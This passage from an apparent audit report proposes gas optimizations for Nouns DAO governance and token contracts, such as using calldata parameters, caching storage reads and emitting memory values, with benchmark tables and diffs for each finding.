### Change to external and use calldata on signature and data (Save 520 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L130-L148

**Gas Benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 26117    | 27113   | 26117 | 29751 |
| After  | 25652    | 26593   | 25652 | 28749 |
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol
130:    function queueTransaction(
131:        address target,
132:        uint256 value,
133:        string memory signature,
134:        bytes memory data,
135:        uint256 eta
136:    ) public returns (bytes32) {

143:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));
        
146:        emit QueueTransaction(txHash, target, value, signature, data, eta);
147:        return txHash;
148:    }
```

```diff
@@ -130,10 +130,10 @@ contract NounsDAOExecutorV2 is UUPSUpgradeable, Initializable {
     function queueTransaction(
         address target,
         uint256 value,
-        string memory signature,
-        bytes memory data,
+        string calldata signature,
+        bytes calldata data,
         uint256 eta
-    ) public returns (bytes32) {
+    ) external returns (bytes32) {
         require(msg.sender == admin, 'NounsDAOExecutor::queueTransaction: Call must come from admin.');
         require(
             eta >= getBlockTimestamp() + delay,
```

### Change to external and use calldata on signature and data (Save 462 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L150-L163

**Gas Benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 10017    | 10068   | 10017 | 10426 |
| After  | 9552    | 9606   | 9552 | 9882 |

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol
150:    function cancelTransaction(
151:        address target,
152:        uint256 value,
153:        string memory signature,
154:        bytes memory data,
155:        uint256 eta
156:    ) public {

159:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));

162:        emit CancelTransaction(txHash, target, value, signature, data, eta);
163:    }
```

```diff
@@ -150,10 +150,10 @@ contract NounsDAOExecutorV2 is UUPSUpgradeable, Initializable {
     function cancelTransaction(
         address target,
         uint256 value,
-        string memory signature,
-        bytes memory data,
+        string calldata signature,
+        bytes calldata data,
         uint256 eta
-    ) public {
+    ) external {
         require(msg.sender == admin, 'NounsDAOExecutor::cancelTransaction: Call must come from admin.');

         bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));
```

### Change to external and use calldata on signature and data (Save 412 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L165-L202

**Gas Benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 2437    | 53364   | 29527 | 339600 |
| After  | 2048    | 52952   | 28893 | 339006 |


```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol
165:    function executeTransaction(
166:        address target,
167:        uint256 value,
168:        string memory signature,
169:        bytes memory data,
170:        uint256 eta
171:    ) public returns (bytes memory) {

174:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));

189:        if (bytes(signature).length == 0) {
190:            callData = data;
191:        } else {
192:            callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);
193:        }

199:        emit ExecuteTransaction(txHash, target, value, signature, data, eta);
```

```diff
@@ -165,10 +165,10 @@ contract NounsDAOExecutorV2 is UUPSUpgradeable, Initializable {
     function executeTransaction(
         address target,
         uint256 value,
-        string memory signature,
-        bytes memory data,
+        string calldata signature,
+        bytes calldata data,
         uint256 eta
-    ) public returns (bytes memory) {
+    ) external returns (bytes memory) {
         require(msg.sender == admin, 'NounsDAOExecutor::executeTransaction: Call must come from admin.');

         bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));
```

### Change to external and use calldata on signature and data (Save 786 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L107-L125

**Gas Benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 26107    | 28172   | 28107 | 29783 |
| After  | 25691    | 27386   | 27691 | 28240 |

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
107:    function queueTransaction(
108:        address target,
109:        uint256 value,
110:        string memory signature,
111:        bytes memory data,
112:        uint256 eta
113:    ) public returns (bytes32) {

120:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));

123:        emit QueueTransaction(txHash, target, value, signature, data, eta);
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
index 2f87cd01..d705c94d 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
@@ -107,10 +107,10 @@ contract NounsDAOExecutor {
     function queueTransaction(
         address target,
         uint256 value,
-        string memory signature,
-        bytes memory data,
+        string calldata signature,
+        bytes calldata data,
         uint256 eta
-    ) public returns (bytes32) {
+    ) external returns (bytes32) {
         require(msg.sender == admin, 'NounsDAOExecutor::queueTransaction: Call must come from admin.');
         require(
             eta >= getBlockTimestamp() + delay,
```

### Change to external and use calldata on signature and data (Save 404 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L127-L140

**Gas Benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 4788    | 8671   | 9985 | 9985 |
| After  | 4456    | 8267   | 9569 | 9569 |
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
127:    function cancelTransaction(
128:        address target,
129:        uint256 value,
130:        string memory signature,
131:        bytes memory data,
132:        uint256 eta
133:    ) public {

136:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));

139:        emit CancelTransaction(txHash, target, value, signature, data, eta);
140:    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
index 2f87cd01..25956a16 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
@@ -127,10 +127,10 @@ contract NounsDAOExecutor {
     function cancelTransaction(
         address target,
         uint256 value,
-        string memory signature,
-        bytes memory data,
+        string calldata signature,
+        bytes calldata data,
         uint256 eta
-    ) public {
+    ) external {
         require(msg.sender == admin, 'NounsDAOExecutor::cancelTransaction: Call must come from admin.');

         bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));
```

### Change to external and use calldata on signature and data (Save 785 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L142-L179

**Gas Benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 2360    | 42009   | 30881 | 142555 |
| After  | 2020    | 41224   | 30668 | 140491 |
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
142:    function executeTransaction(
143:        address target,
144:        uint256 value,
145:        string memory signature,
146:        bytes memory data,
147:        uint256 eta
148:    ) public returns (bytes memory) {

151:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));

166:        if (bytes(signature).length == 0) {
167:            callData = data;
168:        } else {
169:            callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);
170:        }

172:        // solium-disable-next-line security/no-call-value
173:        (bool success, bytes memory returnData) = target.call{ value: value }(callData);


176:        emit ExecuteTransaction(txHash, target, value, signature, data, eta);
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
index 2f87cd01..d3d4b135 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
@@ -142,10 +142,10 @@ contract NounsDAOExecutor {
     function executeTransaction(
         address target,
         uint256 value,
-        string memory signature,
-        bytes memory data,
+        string calldata signature,
+        bytes calldata data,
         uint256 eta
-    ) public returns (bytes memory) {
+    ) external returns (bytes memory) {
         require(msg.sender == admin, 'NounsDAOExecutor::executeTransaction: Call must come from admin.');

         bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));
```

</details>

## [G-04] Expensive operation inside a for loop

### Function `quitInternal()` does a lot of inefficient operation mainly inside it's for loops. I've optimized it as a whole but avoided some common optimizations 
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L218-L245

**As it's an internal one, the gas changes can be seen from the two function `quit`**<br>
`Benchmarks for quit(uint256[])`

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 743    | 245981   | 202066 | 501600 |
| After  | 743    | 245388   | 201653 | 500096 |

`Benchmarks for quit(uint256[],address[])`

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 14309    | 165989   | 151098 | 347452 |
| After  | 14309    | 165727   | 150891 | 346817 |

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
218:    function quitInternal(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) internal {

223:        for (uint256 i = 0; i < tokenIds.length; i++) {
224:            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);
225:        }

231:        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
232:            IERC20 erc20token = IERC20(erc20TokensToInclude[i]);
233:            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;
234:        }

237:        timelock.sendETH(payable(msg.sender), ethToSend);
238:        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
239:            if (balancesToSend[i] > 0) {
240:                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);
241:            }
242:        }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
index 0b098e44..49d60515 100644
--- a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
@@ -219,25 +219,26 @@ contract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, Nou
         checkGovernanceActive();

         uint256 totalSupply = adjustedTotalSupply();
-
+        NounsDAOExecutorV2  _timelock = timelock;
+        INounsTokenForkLike _nouns = nouns;
         for (uint256 i = 0; i < tokenIds.length; i++) {
-            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);
+            _nouns.transferFrom(msg.sender, address(_timelock), tokenIds[i]);
         }

         uint256[] memory balancesToSend = new uint256[](erc20TokensToInclude.length);

         // Capture balances to send before actually sending them, to avoid the risk of external calls changing balances.
-        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;
+        uint256 ethToSend = (address(_timelock).balance * tokenIds.length) / totalSupply;
         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
             IERC20 erc20token = IERC20(erc20TokensToInclude[i]);
-            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;
+            balancesToSend[i] = (erc20token.balanceOf(address(_timelock)) * tokenIds.length) / totalSupply;
         }

         // Send ETH and ERC20 tokens
-        timelock.sendETH(payable(msg.sender), ethToSend);
+        _timelock.sendETH(payable(msg.sender), ethToSend);
         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
             if (balancesToSend[i] > 0) {
-                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);
+                _timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);
             }
         }

```

### Don't read state inside loops,`escrow and forkId` should be cached outside the loop (Save 199 Gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L148-L157

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 6721    | 387833   | 217402 | 3683287 |
| After  | 6754    | 387714   | 217439 | 3680633 |
```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
149:        for (uint256 i = 0; i < tokenIds.length; i++) {
150:            uint256 nounId = tokenIds[i];
151:            if (escrow.ownerOfEscrowedToken(forkId, nounId) != msg.sender) revert OnlyTokenOwnerCanClaim();

156:            _mintWithOriginalSeed(msg.sender, nounId);
157:        }
```

```diff
     function claimFromEscrow(uint256[] calldata tokenIds) external {
+        INounsDAOForkEscrow _escrow =  escrow;
+        uint32 _forkId = forkId;
         for (uint256 i = 0; i < tokenIds.length; i++) {
             uint256 nounId = tokenIds[i];
-            if (escrow.ownerOfEscrowedToken(forkId, nounId) != msg.sender) revert OnlyTokenOwnerCanClaim();
+            if (_escrow.ownerOfEscrowedToken(_forkId, nounId) != msg.sender) revert OnlyTokenOwnerCanClaim();

             _mintWithOriginalSeed(msg.sender, nounId);
         }
```

## [G-05] Cache storage values in memory to minimize SLOADs
The code can be optimized by minimizing the number of SLOADs.

<details>

### NounsDAOLogicV2.sol.propose(): `nouns` should be cached(saves 110 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L206-L213

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 13546    | 439476   | 380456 | 947962 |
| After  | 13434    | 439366   | 380346 | 947852 |

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
206:        temp.totalSupply = nouns.totalSupply();

210:        require(
211:            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,
212:            'NounsDAO::propose: proposer votes below proposal threshold'
213:        );
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..88a92be0 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -203,12 +203,14 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
     ) public returns (uint256) {
         ProposalTemp memory temp;

-        temp.totalSupply = nouns.totalSupply();
+         NounsTokenLike _nouns = nouns;
+
+        temp.totalSupply = _nouns.totalSupply();

         temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);

         require(
-            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,
+            _nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,
             'NounsDAO::propose: proposer votes below proposal threshold'
         );
```

### queueOrRevertInternal(): `timelock` should be cached (Save 1 SLOAD: 200 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L325-L329

**Gas benchmarks** based on the function `queue` that calls our function of interest `queueOrRevertInternal()`

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 1039    | 101175   | 68684 | 173646 |
| After  | 1039    | 100975   | 68586 | 173254 |

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
325:        require(
326:            !timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))),
327:            'NounsDAO::queueOrRevertInternal: identical proposal action already queued at eta'
328:        );
329:        timelock.queueTransaction(target, value, signature, data, eta);
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..8b880214 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -322,11 +322,12 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         bytes memory data,
         uint256 eta
     ) internal {
+        INounsDAOExecutor _timelock = timelock;
         require(
-            !timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))),
+            !_timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))),
             'NounsDAO::queueOrRevertInternal: identical proposal action already queued at eta'
         );
-        timelock.queueTransaction(target, value, signature, data, eta);
+        _timelock.queueTransaction(target, value, signature, data, eta);
     }
```

### NounsDAOLogicV2.sol.veto(): `vetoer` should be cached(saves 92 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L389-L396

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 488    | 25736   | 30324 | 45345 |
| After  | 491    | 25644   | 30239 | 45239 |

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
389:    function veto(uint256 proposalId) external {
390:        if (vetoer == address(0)) {
391:            revert VetoerBurned();
392:        }

394:        if (msg.sender != vetoer) {
395:            revert VetoerOnly();
396:        }
```

```diff
     function veto(uint256 proposalId) external {
-        if (vetoer == address(0)) {
+        address _vetoer = vetoer;
+        if (_vetoer == address(0)) {
             revert VetoerBurned();
         }

-        if (msg.sender != vetoer) {
+        if (msg.sender != _vetoer) {
             revert VetoerOnly();
         }
```

### NounsDAOLogicV2.sol.getDynamicQuorumParamsAt(): `quorumVotesBPS` should be cached(saves 2 SLOADs: 200 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L981-L1005

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
981:    function getDynamicQuorumParamsAt(uint256 blockNumber_) public view returns (DynamicQuorumParams memory) {

985:        if (len == 0) {
986:            return
987:                DynamicQuorumParams({
988:                    minQuorumVotesBPS: safe16(quorumVotesBPS),
989:                    maxQuorumVotesBPS: safe16(quorumVotesBPS),
990:                    quorumCoefficient: 0
991:                });
992:        }

998:        if (quorumParamsCheckpoints[0].fromBlock > blockNumber) {
999:            return
1000:                DynamicQuorumParams({
1001:                    minQuorumVotesBPS: safe16(quorumVotesBPS),
1002:                    maxQuorumVotesBPS: safe16(quorumVotesBPS),
1003:                    quorumCoefficient: 0
1004:                });
1005:        }
```

```diff
@@ -981,12 +981,14 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
     function getDynamicQuorumParamsAt(uint256 blockNumber_) public view returns (DynamicQuorumParams memory) {
         uint32 blockNumber = safe32(blockNumber_, 'NounsDAO::getDynamicQuorumParamsAt: block number exceeds 32 bits');
         uint256 len = quorumParamsCheckpoints.length;
+

         if (len == 0) {
+            uint16 _quorumVotesBPS  = safe16(quorumVotesBPS);
             return
                 DynamicQuorumParams({
-                    minQuorumVotesBPS: safe16(quorumVotesBPS),
-                    maxQuorumVotesBPS: safe16(quorumVotesBPS),
+                    minQuorumVotesBPS: _quorumVotesBPS,
+                    maxQuorumVotesBPS: _quorumVotesBPS,
                     quorumCoefficient: 0
                 });
         }
@@ -996,10 +998,11 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         }

         if (quorumParamsCheckpoints[0].fromBlock > blockNumber) {
+            uint16 _quorumVotesBPS  = safe16(quorumVotesBPS);
             return
                 DynamicQuorumParams({
-                    minQuorumVotesBPS: safe16(quorumVotesBPS),
-                    maxQuorumVotesBPS: safe16(quorumVotesBPS),
+                    minQuorumVotesBPS: _quorumVotesBPS,
+                    maxQuorumVotesBPS: _quorumVotesBPS,
                     quorumCoefficient: 0
                 });
         }
```

### NounsAuctionHouseFork.sol.\_safeTransferETHWithFallback(): `weth` should be cached (Save 1 SLOAD: ~97 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol#L261-L265

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol
261:    function _safeTransferETHWithFallback(address to, uint256 amount) internal {
262:        if (!_safeTransferETH(to, amount)) {
263:            IWETH(weth).deposit{ value: amount }();
264:            IERC20(weth).transfer(to, amount);
265:        }
```

```diff
     function _safeTransferETHWithFallback(address to, uint256 amount) internal {
         if (!_safeTransferETH(to, amount)) {
-            IWETH(weth).deposit{ value: amount }();
-            IERC20(weth).transfer(to, amount);
+            address _weth = weth;
+            IWETH(_weth).deposit{ value: amount }();
+            IERC20(_weth).transfer(to, amount);
         }
     }
```

### NounsDAOLogicV1Fork.sol.adjustedTotalSupply(): `nouns` should be cached (Save 237 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L777-L779

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 4709    | 8709   | 8709 | 12709 |
| After  | 4472    | 8472   | 8472 | 12472 |
```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
777:    function adjustedTotalSupply() public view returns (uint256) {
778:        return nouns.totalSupply() - nouns.balanceOf(address(timelock)) + nouns.remainingTokensToClaim();
779:    }
```

```diff

     function adjustedTotalSupply() public view returns (uint256) {
-        return nouns.totalSupply() - nouns.balanceOf(address(timelock)) + nouns.remainingTokensToClaim();
+        INounsTokenForkLike _nouns =  nouns;
+        return _nouns.totalSupply() - _nouns.balanceOf(address(timelock)) + _nouns.remainingTokensToClaim();
     }

```

</details>

## [G-06] Use the existing Local variable/global variable when equal to a state variable to avoid reading from state

### Local variable `_escrow` should be used instead of reading `escrow`
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L131-L137

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 211357    | 224893   | 211357 | 255180 |
| After  | 211339    | 224875   | 211339 | 255162 |
```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
131:        escrow = _escrow;
        
137:        NounsTokenFork originalToken = NounsTokenFork(address(escrow.nounsToken()));
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsT
okenFork.sol
index a1f9d6d3..fea6fad8 100644
--- a/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
@@ -134,7 +134,7 @@ contract NounsTokenFork is INounsTokenFork, OwnableUpgradeable, ERC721Checkpoint
         remainingTokensToClaim = tokensToClaim;
         forkingPeriodEndTimestamp = _forkingPeriodEndTimestamp;

-        NounsTokenFork originalToken = NounsTokenFork(address(escrow.nounsToken()));
+        NounsTokenFork originalToken = NounsTokenFork(address(_escrow.nounsToken()));
         descriptor = originalToken.descriptor();
         seeder = originalToken.seeder();
     }
```

### Global variable `msg.sender` should be used instead of reading state (Save 128 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L240-L260

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 13546    | 439476   | 380456 | 947962 |
| After  | 13456    | 439348   | 380323 | 947829 |

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
240:        Proposal storage newProposal = _proposals[proposalCount];

242:        newProposal.proposer = msg.sender;

260:        latestProposalIds[newProposal.proposer] = newProposal.id;
```
We are setting `newProposal.proposer` to be equal to `msg.sender`. As `newProposal.proposer` is a state variable, it's a bit expensive to read, we can instead read `msg.sender` which is a global variable, thus more cheaper to read.
```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..9328d9ce 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -257,7 +257,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         newProposal.totalSupply = temp.totalSupply;
         newProposal.creationBlock = block.number;

-        latestProposalIds[newProposal.proposer] = newProposal.id;
+        latestProposalIds[msg.sender] = newProposal.id;

```

## [G-07] Emitting storage values instead of the memory one
Here, the values emitted shouldn’t be read from storage. The existing memory values should be used instead:

<details>

### NounsDAOLogicV2.sol.\_setVotingDelay(): Emit `newVotingDelay` instead of `votingDelay` (Save 1 SLOAD: 100 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L644-L656

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
644:    function _setVotingDelay(uint256 newVotingDelay) external {

652:        uint256 oldVotingDelay = votingDelay;
653:        votingDelay = newVotingDelay;

655:        emit VotingDelaySet(oldVotingDelay, votingDelay);
656:    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..c0b85b3f 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -652,7 +652,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         uint256 oldVotingDelay = votingDelay;
         votingDelay = newVotingDelay;

-        emit VotingDelaySet(oldVotingDelay, votingDelay);
+        emit VotingDelaySet(oldVotingDelay, newVotingDelay);
     }

```

### NounsDAOLogicV2.sol.\_setVotingPeriod(): Emit `newVotingPeriod` instead of `votingPeriod` (Save 1 SLOAD: 100 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L662-L674

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
662:    function _setVotingPeriod(uint256 newVotingPeriod) external {

671:        votingPeriod = newVotingPeriod;

673:        emit VotingPeriodSet(oldVotingPeriod, votingPeriod);
674:    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..96f8682a 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -670,7 +670,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         uint256 oldVotingPeriod = votingPeriod;
         votingPeriod = newVotingPeriod;

-        emit VotingPeriodSet(oldVotingPeriod, votingPeriod);
+        emit VotingPeriodSet(oldVotingPeriod, newVotingPeriod);
     }
```

### NounsDAOLogicV2.sol.\_setProposalThresholdBPS(): Emit `newProposalThresholdBPS` instead of `proposalThresholdBPS` (Save 1 SLOAD: 100 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L681-L694

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
681:    function _setProposalThresholdBPS(uint256 newProposalThresholdBPS) external {

691:        proposalThresholdBPS = newProposalThresholdBPS;

693:        emit ProposalThresholdBPSSet(oldProposalThresholdBPS, proposalThresholdBPS);
694:    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..0c6ad8cf 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -690,7 +690,7 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         uint256 oldProposalThresholdBPS = proposalThresholdBPS;
         proposalThresholdBPS = newProposalThresholdBPS;

-        emit ProposalThresholdBPSSet(oldProposalThresholdBPS, proposalThresholdBPS);
+        emit ProposalThresholdBPSSet(oldProposalThresholdBPS, newProposalThresholdBPS);
     }
```

### Use the cheaper global variable(msg.sender) instead of reading from state when emitting (Save 1 SLOAD: ~100 gas)
